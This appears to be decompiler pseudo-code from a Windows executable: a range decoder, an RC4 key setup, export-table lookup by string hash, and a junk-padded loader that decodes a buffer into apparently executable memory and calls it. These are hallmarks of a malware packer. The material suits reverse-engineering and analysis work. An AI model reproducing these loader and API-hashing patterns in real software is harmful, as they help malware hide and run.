        {
          a3[3] -= v92;
          v24 -= v92;
          *(_DWORD *)*(a3 - 11) = v91 - (v91 >> 5);
          v13 = 2 * v13 + 1;
          if ( !v60 )
            goto LABEL_69;
        }
        else
        {
          v24 = v91 * (v24 >> 11);
          v13 *= 2;
          *(_DWORD *)*(a3 - 11) = v91 + ((2048 - v91) >> 5);
          if ( v60 )
            goto LABEL_69;
        }
        if ( v13 >= 256 )
          goto LABEL_115;
      }
    }
    do
    {
      v19 = (unsigned int *)(*(a3 - 8) + 4 * v13);
      if ( v24 < 0x1000000 )
      {
        v20 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
        v24 <<= 8;
        ++*(a3 - 2);
        a3[3] = v20;
      }
      v87 = *v19;
      v88 = *v19 * (v24 >> 11);
      if ( a3[3] >= v88 )
      {
        a3[3] -= v88;
        v24 -= v88;
        *v19 = v87 - (v87 >> 5);
        v13 = 2 * v13 + 1;
      }
      else
      {
        v24 = *v19 * (v24 >> 11);
        *v19 = v87 + ((2048 - v87) >> 5);
        v13 *= 2;
      }
LABEL_69:
      ;
    }
    while ( v13 < 256 );
LABEL_115:
    v97 = *(a3 - 4);
    v98 = a3[2];
    ++*(a3 - 4);
    v103 = *(a3 - 3) < 4;
    *((_BYTE *)a3 - 1) = v13;
    *(_BYTE *)(v97 + v98) = v13;
    if ( v103 )
    {
      *(a3 - 3) = 0;
    }
    else if ( (int)*(a3 - 3) >= 10 )
    {
      *(a3 - 3) -= 6;
    }
    else
    {
      *(a3 - 3) -= 3;
    }
LABEL_23:
    a5 = *(a3 - 4) & 3;
    a4 = (unsigned int *)(a3[4] + 4 * (a5 + 16 * *(a3 - 3)));
    if ( v24 < 0x1000000 )
      JUMPOUT(0x407779);
  }
  a3[3] -= v57;
  v66 = v56 - (v56 >> 5);
  v67 = *(a3 - 3);
  v36 = v24 - v57;
  *a4 = v66;
  v34 = (unsigned int *)(a3[4] + 4 * v67 + 768);
  if ( v36 < 0x1000000 )
  {
    v35 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
    v36 <<= 8;
    ++*(a3 - 2);
    a3[3] = v35;
  }
  v26 = *v34;
  v68 = *v34 * (v36 >> 11);
  if ( a3[3] >= v68 )
  {
    a3[3] -= v68;
    v85 = v36 - v68;
    v86 = v26 - (v26 >> 5);
    *v34 = v86;
    v44 = (unsigned int *)(a3[4] + 4 * *(a3 - 3) + 816);
    if ( v85 < 0x1000000 )
    {
      v45 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      v85 <<= 8;
      ++*(a3 - 2);
      a3[3] = v45;
    }
    v14 = *v44;
    v15 = *v44 * (v85 >> 11);
    if ( a3[3] >= v15 )
    {
      a3[3] -= v15;
      v74 = v85 - v15;
      v75 = v14 - (v14 >> 5);
      v76 = a3[4];
      *v44 = v75;
      v107 = (unsigned int *)(v76 + 4 * *(a3 - 3) + 864);
      if ( v74 < 0x1000000 )
      {
        v108 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
        v74 <<= 8;
        ++*(a3 - 2);
        a3[3] = v108;
      }
      v72 = *v107;
      v73 = *v107 * (v74 >> 11);
      if ( a3[3] >= v73 )
      {
        a3[3] -= v73;
        v33 = v74 - v73;
        *v107 = v72 - (v72 >> 5);
        v31 = (unsigned int *)(a3[4] + 4 * *(a3 - 3) + 912);
        if ( v33 < 0x1000000 )
        {
          v32 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
          v33 <<= 8;
          ++*(a3 - 2);
          a3[3] = v32;
        }
        v64 = *v31;
        v37 = v64 * (v33 >> 11);
        if ( a3[3] >= v37 )
        {
          a3[3] -= v37;
          v38 = v33 - v37;
          *v31 = v64 - (v64 >> 5);
          v54 = *(a3 - 10);
          *(a3 - 10) = *(a3 - 6);
        }
        else
        {
          v38 = v64 * (v33 >> 11);
          v39 = v64 + ((2048 - v64) >> 5);
          v54 = *(a3 - 6);
          *v31 = v39;
        }
        *(a3 - 6) = *(a3 - 7);
      }
      else
      {
        v38 = *v107 * (v74 >> 11);
        v100 = v72 + ((2048 - v72) >> 5);
        v54 = *(a3 - 7);
        *v107 = v100;
      }
      *(a3 - 7) = *(a3 - 5);
      *(a3 - 5) = v54;
    }
    else
    {
      v16 = v14 + ((2048 - v14) >> 5);
      v17 = 16 * (*(a3 - 3) + 15);
      *v44 = v16;
      v101 = v15;
      v102 = (unsigned int *)(a3[4] + 4 * (a5 + v17));
      if ( v15 < 0x1000000 )
      {
        v101 = v15 << 8;
        v63 = *(unsigned __int8 *)(*(a3 - 2))++ | (a3[3] << 8);
        a3[3] = v63;
      }
      v110 = *v102;
      v51 = v110 * (v101 >> 11);
      if ( a3[3] < v51 )
      {
        v52 = *(a3 - 4);
        v24 = v110 * (v101 >> 11);
        v29 = __OFSUB__(*(a3 - 3), 7);
        v28 = *(a3 - 3) - 7 < 0;
        *v102 = v110 + ((2048 - v110) >> 5);
        v30 = a3[2];
        *(a3 - 3) = 2 * (v28 == v29) + 9;
        v84 = *(a3 - 4) - *(a3 - 5);
        ++*(a3 - 4);
        LOBYTE(v84) = *(_BYTE *)(v84 + v30);
        *((_BYTE *)a3 - 1) = v84;
        *(_BYTE *)(v52 + v30) = v84;
        goto LABEL_23;
      }
      a3[3] -= v51;
      v38 = v101 - v51;
      *v102 = v110 - (v110 >> 5);
    }
    *(a3 - 3) = *(a3 - 3) >= 7 ? 11 : 8;
    v11 = (unsigned int *)(a3[4] + 5328);
  }
  else
  {
    v38 = *v34 * (v36 >> 11);
    v82 = v26 + ((2048 - v26) >> 5);
    v58 = *(a3 - 3) < 7;
    *(a3 - 10) = *(a3 - 6);
    *(a3 - 6) = *(a3 - 7);
    v59 = *(a3 - 5);
    *v34 = v82;
    *(a3 - 7) = v59;
    if ( v58 )
      *(a3 - 3) = 0;
    else
      *(a3 - 3) = 3;
    v11 = (unsigned int *)(a3[4] + 3272);
  }
  if ( v38 < 0x1000000 )
  {
    v71 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
    v38 <<= 8;
    ++*(a3 - 2);
    a3[3] = v71;
  }
  v80 = *v11;
  v40 = v80 * (v38 >> 11);
  if ( a3[3] >= v40 )
  {
    a3[3] -= v40;
    v53 = v38 - v40;
    *v11 = v80 - (v80 >> 5);
    if ( v53 < 0x1000000 )
    {
      v42 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      v53 <<= 8;
      ++*(a3 - 2);
      a3[3] = v42;
    }
    v89 = v11[1];
    v106 = v89 * (v53 >> 11);
    if ( a3[3] >= v106 )
    {
      a3[3] -= v106;
      v24 = v53 - v106;
      v11[1] = v89 - (v89 >> 5);
      v41 = (int)(v11 + 258);
      *(a3 - 9) = 16;
      *(a3 - 8) = 8;
      goto LABEL_18;
    }
    v24 = v89 * (v53 >> 11);
    v11[1] = v89 + ((2048 - v89) >> 5);
    v41 = (int)&v11[8 * a5 + 130];
    *(a3 - 9) = 8;
  }
  else
  {
    v24 = v80 * (v38 >> 11);
    *(a3 - 9) = 0;
    *v11 = v80 + ((2048 - v80) >> 5);
    v41 = (int)&v11[8 * a5 + 2];
  }
  *(a3 - 8) = 3;
LABEL_18:
  *(a3 - 11) = *(a3 - 8);
  v105 = 1;
  do
  {
    if ( v24 < 0x1000000 )
    {
      v90 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      v24 <<= 8;
      ++*(a3 - 2);
      a3[3] = v90;
    }
    v49 = *(_DWORD *)(v41 + 4 * v105);
    v50 = v49 * (v24 >> 11);
    if ( a3[3] >= v50 )
    {
      a3[3] -= v50;
      v24 -= v50;
      *(_DWORD *)(v41 + 4 * v105) = v49 - (v49 >> 5);
      v105 = 2 * v105 + 1;
    }
    else
    {
      v24 = v49 * (v24 >> 11);
      *(_DWORD *)(v41 + 4 * v105) = v49 + ((2048 - v49) >> 5);
      v105 *= 2;
    }
    v78 = (*(a3 - 11))-- == 1;
  }
  while ( !v78 );
  v55 = 1;
  v18 = *(a3 - 9) - (1 << *(a3 - 8)) + v105;
  v103 = *(a3 - 3) < 4;
  *(a3 - 12) = v18;
  if ( !v103 )
  {
    v43 = *(a3 - 5);
    goto LABEL_22;
  }
  *(a3 - 3) += 7;
  if ( v18 >= 4 )
    v12 = 3;
  else
    v12 = v18;
  v83 = (v12 << 8) + a3[4] + 1728;
  *(a3 - 11) = 6;
  do
  {
    if ( v24 < 0x1000000 )
    {
      v77 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
      v24 <<= 8;
      ++*(a3 - 2);
      a3[3] = v77;
    }
    v9 = *(_DWORD *)(v83 + 4 * v55);
    v10 = v9 * (v24 >> 11);
    if ( a3[3] >= v10 )
    {
      a3[3] -= v10;
      v24 -= v10;
      *(_DWORD *)(v83 + 4 * v55) = v9 - (v9 >> 5);
      v55 = 2 * v55 + 1;
    }
    else
    {
      v24 = v9 * (v24 >> 11);
      *(_DWORD *)(v83 + 4 * v55) = v9 + ((2048 - v9) >> 5);
      v55 *= 2;
    }
    v78 = (*(a3 - 11))-- == 1;
  }
  while ( !v78 );
  v99 = v55 - 64;
  v69 = v99;
  if ( v99 >= 4 )
  {
    v81 = (v99 >> 1) - 1;
    v65 = v99 & 1 | 2;
    *(a3 - 5) = v81;
    if ( v99 >= 14 )
    {
      v70 = (v99 >> 1) - 5;
      do
      {
        if ( v24 < 0x1000000 )
        {
          v8 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
          v24 <<= 8;
          ++*(a3 - 2);
          a3[3] = v8;
        }
        v24 >>= 1;
        v65 *= 2;
        if ( a3[3] >= v24 )
        {
          a3[3] -= v24;
          v65 |= 1u;
        }
        --v70;
      }
      while ( v70 );
      v27 = a3[4] + 3208;
      v69 = 16 * v65;
      *(a3 - 5) = 4;
    }
    else
    {
      v69 = v65 << v81;
      v27 = a3[4] + 4 * (v69 - v99) + 2748;
    }
    v25 = 1;
    *(a3 - 8) = v27;
    *(a3 - 9) = 1;
    do
    {
      if ( v24 < 0x1000000 )
      {
        v109 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
        v24 <<= 8;
        ++*(a3 - 2);
        a3[3] = v109;
      }
      v47 = *(_DWORD *)(v27 + 4 * v25);
      v48 = v47 * (v24 >> 11);
      if ( a3[3] >= v48 )
      {
        a3[3] -= v48;
        v27 = *(a3 - 8);
        v24 -= v48;
        v69 |= *(a3 - 9);
        *(_DWORD *)(v27 + 4 * v25) = v47 - (v47 >> 5);
        v25 = 2 * v25 + 1;
      }
      else
      {
        v24 = v47 * (v24 >> 11);
        *(_DWORD *)(v27 + 4 * v25) = v47 + ((2048 - v47) >> 5);
        v25 *= 2;
      }
      *(a3 - 9) *= 2;
      v78 = (*(a3 - 5))-- == 1;
    }
    while ( !v78 );
  }
  v43 = v69 + 1;
  *(a3 - 5) = v43;
  if ( v43 )
  {
    v18 = *(a3 - 12);
LABEL_22:
    v21 = v18 + 2;
    v22 = (char *)(a3[2] + *(a3 - 4) - v43);
    do
    {
      v93 = *v22;
      v94 = *(a3 - 4);
      v95 = a3[2];
      --v21;
      *(a3 - 4) = v94 + 1;
      ++v22;
      *((_BYTE *)a3 - 1) = v93;
      *(_BYTE *)(v94 + v95) = v93;
    }
    while ( v21 );
    goto LABEL_23;
  }
  return *(a3 - 4);
}
// 408D61: positive sp value 4 has been found
// 407773: control flows out of bounds to 407779

//----- (00407DB4) --------------------------------------------------------
int __cdecl sub_407DB4(int a1, int a2, _BYTE *a3)
{
  unsigned int v3; // esi
  _BYTE *v4; // eax
  int result; // eax
  unsigned int i; // esi
  unsigned __int8 v7; // al
  char v8; // cl
  unsigned __int8 v9; // bl
  _BYTE *v10; // [esp+Ch] [ebp-8h]
  unsigned __int8 v11; // [esp+13h] [ebp-1h]

  v3 = 0;
  v4 = a3;
  do
  {
    v8 = v3++;
    *v4++ = v8;
  }
  while ( v3 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v11 = 0;
  v9 = 0;
  v10 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v7 = v9 + *v10 + *(_BYTE *)(a1 + v11);
    v9 = v7;
    sub_408882(&a3[i], &a3[v7]);
    result = (v11 + 1) / a2;
    v11 = (v11 + 1) % a2;
    ++v10;
  }
  return result;
}

//----- (00408882) --------------------------------------------------------
_BYTE *__cdecl sub_408882(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (004089A1) --------------------------------------------------------
void __usercall sub_4089A1(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  qmemcpy(a2, a3, a1);
}

//----- (00408A45) --------------------------------------------------------
char *__usercall sub_408A45@<eax>(int a1@<edx>, int a2@<ebx>)
{
  unsigned int v2; // esi
  int v3; // eax
  unsigned int v4; // ecx
  HRSRC (__stdcall **v5)(HMODULE, LPCSTR, LPCSTR); // ebx
  int v6; // ecx
  int v7; // esi
  int v8; // ebx
  int v9; // ecx
  int v10; // ecx
  int v11; // edx
  _BYTE *v12; // esi
  int v13; // edx
  int v14; // eax
  int v15; // edi
  int v16; // ecx
  int v17; // edi
  int v18; // edx
  int v19; // ecx
  int v20; // esi
  char v21; // al
  int v22; // edx
  char *result; // eax
  int v24; // edx
  int v25; // ebx
  int v26; // ebx
  char *v27; // ebx
  int v28; // edi
  int v29; // eax
  char *v30; // ebx
  int v31; // ecx
  int v32; // ecx
  int v33; // ecx
  int v34; // esi
  _BYTE *v35; // edi
  int v36; // edi
  int v37; // edi
  int v38; // edx
  bool v39; // cf
  _BYTE *v40; // edi
  HRSRC (__stdcall **v41)(HMODULE, LPCSTR, LPCSTR); // esi
  int v42; // ebx
  int v43; // eax
  int v44; // ecx
  int v45; // ecx
  _BYTE *v46; // edi
  int v47; // [esp-8h] [ebp-8h]
  int v48; // [esp-4h] [ebp-4h]

  BYTE1(a1) += BYTE2(dword_43FB56);
  v33 = 0x2000;
  v34 = 0x2000;
  v35 = &unk_420FE6;
  LOBYTE(a2) = 55;
  dword_43E018 += a1;
  do
  {
    v20 = dword_43E9B4 + v34;
    LOBYTE(dword_43E044) = dword_43E044 + 65;
    v48 = v33;
    dword_43E010 += a2;
    v21 = sub_405BF5();
    LOBYTE(dword_43E020) = 33;
    *v35++ = v21;
    dword_43E034 = 9316;
    dword_43E008 += v22;
    v39 = __CFADD__(dword_43FAEC, v20);
    v34 = dword_43FAEC + v20;
    a2 = dword_43EEB4;
    v33 = v48 - 1;
  }
  while ( v48 != 1 );
  dword_43E004 = v34;
  v9 = v39 + v33 + 17501;
  BYTE1(v9) = (_BYTE)v35;
  dword_43FD7E(v9, 255, &unk_420EE6);
  dword_43E00C -= v10;
  LOBYTE(v11) = byte_43F470;
  dword_43E04C = dword_43F5A8;
  dword_43E044 = (int)&v35[v39 + 19892];
  dword_43FBA1(dword_43E8D0, v11, &unk_420EE6, &unk_43FBC1, 0, &unk_43FC5B);
  v27 = (char *)&CreateFileA + dword_43ED00;
  dword_43E004 = 23405;
  dword_43E01C -= (int)&GetSystemTime + 4601;
  LOBYTE(dword_43E02C) = 115;
  dword_43E034 = v4 >> 5;
  v43 = dword_43FB8E(&unk_43FC5B, -1073741824, 1, 0, 2, 32, 0);
  dword_43E004 += (int)&FindResourceA + 11833;
  dword_43E028 = v44;
  dword_43E020 = (int)&FindResourceA + 11833;
  LOBYTE(dword_43E044) = -90;
  BYTE1(v27) -= byte_43EC80;
  v30 = &v27[dword_43F74C];
  LOBYTE(v30) = byte_43F644;
  dword_43FD72(15177, dword_43F3F0, v43, &unk_420FE6, 0x2000, &dword_43FC33, 0, v43);
  dword_43FC03(dword_43E57C + v31);
  LOBYTE(dword_43E044) = 39;
  dword_43E00C = 11944;
  dword_43E010 -= (int)v30;
  v41 = &FindResourceA + 9457;
  v6 = 0x2000;
  dword_43E02C += (int)(&FindResourceA + 9457);
  v40 = &unk_420FE6;
  v5 = (HRSRC (__stdcall **)(HMODULE, LPCSTR, LPCSTR))&LoadResource;
  do
  {
    v47 = v6;
    dword_43E04C = (int)v5 + (v41 < v5) + 11825;
    *v40++ = sub_405BF5();
    v41 = (HRSRC (__stdcall **)(HMODULE, LPCSTR, LPCSTR))(dword_43E430 + dword_43F068);
    v5 = (HRSRC (__stdcall **)(HMODULE, LPCSTR, LPCSTR))&WriteFile;
    v6 = v47 - 1;
  }
  while ( v47 != 1 );
  dword_43E030 = dword_43E430 + dword_43F068;
  v7 = (int)v41 + ((unsigned __int8)((unsigned __int16)&WriteFile >> 8) < 0xC7u) + 13929;
  v8 = dword_43EBE8;
  result = sub_40962D(1769630462);
  dword_43E048 = v24;
  v25 = dword_43F9D8 + v8;
  dword_43E018 += 4445;
  dword_43E040 = v25;
  if ( result )
  {
    v42 = dword_43E2C4;
    dword_43FC33 = (__int64 (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
    dword_43E01C = 17836;
    result = sub_40962D(976580703);
    v26 = __CFADD__(dword_43EE7C, v38) + v42 + 1144;
    if ( result )
    {
      dword_43E048 = v7 + 19658;
      dword_43FB62 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
      dword_43E00C = 3034;
      dword_43E01C += v26 + 6353;
      result = (char *)dword_43FC33(15564, 0, 0x2000, 12288, 64);
      LOBYTE(dword_43E030) = -46;
      if ( result )
      {
        dword_43FD5A = (int)result;
        dword_43E004 += dword_43E730 + v32;
        LOBYTE(dword_43E020) = -16;
        v36 = (dword_43ED5C ^ 0x568) - dword_43EA1C;
        v3 = dword_43FB8E(&unk_43FC5B, -1073741824, 1, 0, 3, 0, 0);
        dword_43E018 += v36;
        v2 = dword_43EFB0;
        dword_43E008 += v36;
        dword_43E03C = dword_43EFB0;
        dword_43FBEF(dword_43F46C, &LoadResource, v3, dword_43FD5A, 0x2000, &unk_420EE6, 0, v3);
        v17 = dword_43E1F8;
        dword_43E010 += v18;
        dword_43FC03(v19);
        dword_43E024 = v2;
        v28 = (v2 < 0x7D1A) + v17 + 2014;
        dword_43E014 = v2 - 32026;
        v29 = dword_43FC43(&unk_43FC5B);
        v16 = 0x2000;
        v12 = (_BYTE *)dword_43FD5A;
        dword_43E02C -= v28 - 6374;
        v13 = 0;
        v37 = v29;
        v14 = 0;
        v15 = v37 - dword_43EA54;
        LOBYTE(dword_43E034) = -25;
        do
        {
          dword_43E030 += v15;
          LOBYTE(v14) = *v12++;
          v13 += v14;
          v14 = 0;
          v15 = 31613;
          --v16;
        }
        while ( v16 );
        dword_43FC0B = v13;
        dword_43FB62(4570, 23942, dword_43FD5A, 0, 0x8000);
        result = 0;
        v45 = 0x2000;
        v46 = &unk_420FE6;
        dword_43E008 = 18863;
        do
        {
          *v46++ = 0;
          LOBYTE(dword_43E02C) = dword_43E02C - 98;
          --v45;
        }
        while ( v45 );
      }
    }
  }
  return result;
}
// 4073AF: conditional instruction was optimized away because %0x18.4==1
// 407D9D: variable 'v24' is possibly undefined
// 407AC2: variable 'v22' is possibly undefined
// 4072FA: variable 'v38' is possibly undefined
// 4085E5: variable 'v32' is possibly undefined
// 407834: variable 'v18' is possibly undefined
// 40783A: variable 'v19' is possibly undefined
// 4075B4: variable 'v10' is possibly undefined
// 4075AB: variable 'v39' is possibly undefined
// 40830F: variable 'v11' is possibly undefined
// 407134: variable 'v4' is possibly undefined
// 40908C: variable 'v44' is possibly undefined
// 408572: variable 'v31' is possibly undefined
// 43E004: using guessed type int dword_43E004;
// 43E008: using guessed type int dword_43E008;
// 43E00C: using guessed type int dword_43E00C;
// 43E010: using guessed type int dword_43E010;
// 43E014: using guessed type int dword_43E014;
// 43E018: using guessed type int dword_43E018;
// 43E01C: using guessed type int dword_43E01C;
// 43E020: using guessed type int dword_43E020;
// 43E024: using guessed type int dword_43E024;
// 43E028: using guessed type int dword_43E028;
// 43E02C: using guessed type int dword_43E02C;
// 43E030: using guessed type int dword_43E030;
// 43E034: using guessed type int dword_43E034;
// 43E03C: using guessed type int dword_43E03C;
// 43E040: using guessed type int dword_43E040;
// 43E044: using guessed type int dword_43E044;
// 43E048: using guessed type int dword_43E048;
// 43E04C: using guessed type int dword_43E04C;
// 43E1F8: using guessed type int dword_43E1F8;
// 43E2C4: using guessed type int dword_43E2C4;
// 43E430: using guessed type int dword_43E430;
// 43E57C: using guessed type int dword_43E57C;
// 43E730: using guessed type int dword_43E730;
// 43E8D0: using guessed type int dword_43E8D0;
// 43E9B4: using guessed type int dword_43E9B4;
// 43EA1C: using guessed type int dword_43EA1C;
// 43EA54: using guessed type int dword_43EA54;
// 43EBE8: using guessed type int dword_43EBE8;
// 43EC80: using guessed type char byte_43EC80;
// 43ED00: using guessed type int dword_43ED00;
// 43ED5C: using guessed type int dword_43ED5C;
// 43EE7C: using guessed type int dword_43EE7C;
// 43EEB4: using guessed type int dword_43EEB4;
// 43EFB0: using guessed type int dword_43EFB0;
// 43F068: using guessed type int dword_43F068;
// 43F3F0: using guessed type int dword_43F3F0;
// 43F46C: using guessed type int dword_43F46C;
// 43F470: using guessed type char byte_43F470;
// 43F5A8: using guessed type int dword_43F5A8;
// 43F644: using guessed type char byte_43F644;
// 43F74C: using guessed type int dword_43F74C;
// 43F9D8: using guessed type int dword_43F9D8;
// 43FAEC: using guessed type int dword_43FAEC;
// 43FB56: using guessed type int dword_43FB56;
// 43FB62: using guessed type int (__fastcall *dword_43FB62)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FB8E: using guessed type int (__stdcall *dword_43FB8E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FBA1: using guessed type int (__fastcall *dword_43FBA1)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FBEF: using guessed type int (__fastcall *dword_43FBEF)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC03: using guessed type int (__thiscall *dword_43FC03)(_DWORD);
// 43FC0B: using guessed type int dword_43FC0B;
// 43FC33: using guessed type __int64 (__thiscall *dword_43FC33)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC43: using guessed type int (__stdcall *dword_43FC43)(_DWORD);
// 43FD5A: using guessed type int dword_43FD5A;
// 43FD72: using guessed type int (__fastcall *dword_43FD72)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FD7E: using guessed type int (__thiscall *dword_43FD7E)(_DWORD, _DWORD, _DWORD);

//----- (004094E4) --------------------------------------------------------
unsigned int __cdecl sub_4094E4(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (0040962D) --------------------------------------------------------
char *__cdecl sub_40962D(int a1)
{
  struct _LIST_ENTRY *v2; // ebx
  _DWORD *v3; // edi
  unsigned int i; // esi
  unsigned __int16 *v5; // [esp+10h] [ebp-Ch]
  _DWORD *v6; // [esp+14h] [ebp-8h]
  int v7; // [esp+18h] [ebp-4h]

  v2 = sub_4076FF();
  v3 = (struct _LIST_ENTRY **)((char *)&v2->Flink + *(unsigned int *)((char *)&v2[15].Flink + (unsigned int)v2[7].Blink));
  if ( HIWORD(a1) )
  {
    v6 = (struct _LIST_ENTRY **)((char *)&v2->Flink + v3[8]);
    v5 = (unsigned __int16 *)((char *)v2 + v3[9]);
    for ( i = 0; v3[6] > i; ++i )
    {
      if ( sub_4094E4((_BYTE *)v2 + *v6) == a1 )
      {
        v7 = *v5;
        break;
      }
      ++v6;
      ++v5;
    }
    if ( v3[6] == i )
      return 0;
  }
  else
  {
    v7 = (unsigned __int16)a1 - v3[4];
  }
  return (char *)v2 + *(unsigned int *)((char *)&v2->Flink + 4 * v7 + v3[7]);
}
// 4093A9: variable 'v7' is possibly undefined

// nfuncs=46 queued=46 decompiled=46 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 46 function(s)"
